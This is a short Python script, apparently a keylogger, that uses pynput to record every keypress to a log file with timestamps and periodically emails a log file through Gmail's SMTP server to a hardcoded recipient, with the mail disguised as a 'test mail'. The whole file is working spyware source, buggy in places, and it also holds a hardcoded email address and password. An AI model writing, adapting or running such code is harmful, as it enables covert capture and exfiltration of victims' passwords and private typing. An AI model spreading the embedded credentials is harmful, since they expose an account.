import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from pynput.keyboard import Listener

gun = datetime.datetime.now().strftime("%d")
ay = datetime.datetime.now().strftime("%m")
yil = datetime.datetime.now().strftime("%Y")
saat = datetime.datetime.now().strftime("%H")
dakika = datetime.datetime.now().strftime("%M")

tarihsaat = datetime.datetime.now().strftime("%d-%m-%Y %H:%M")

def mailGonder():
    mail_content = '''Hello,
        This is a test mail.
        In this mail we are sending some attachments.
        The mail is sent using Python SMTP library.
        Thank You
        '''
    #The mail addresses and password
    sender_address = 'kpasseras1234@gmail.com'
    sender_pass = 'olcay1453!'
    receiver_address = 'olcaycoban3737@gmail.com'
    #Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'A test mail sent by Python. It has an attachment.'
    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = 'Log2.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')

def static_vars(**kwargs):
    def decorate(func):
        for k in kwargs:
            setattr(func, k, kwargs[k])
        return func
    return decorate

@static_vars(counter=1)
def foo():
    foo.counter += 1

def WriteToFile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")
    if keydata=="Key.space":
        keydata=' '+tarihsaat+' \n'
        foo.counter+=1
        if foo.counter % 10 == 0:
            mailGonder()
            open("Log3.txt", 'w')
    elif keydata=="Key.down" or keydata=="Key.up":
        keydata=""
    with open("Log3.txt",'a') as f:
        f.write(keydata)
    if sum == 10:
        mailGonder()
with Listener(on_press=WriteToFile) as f:
    f.join()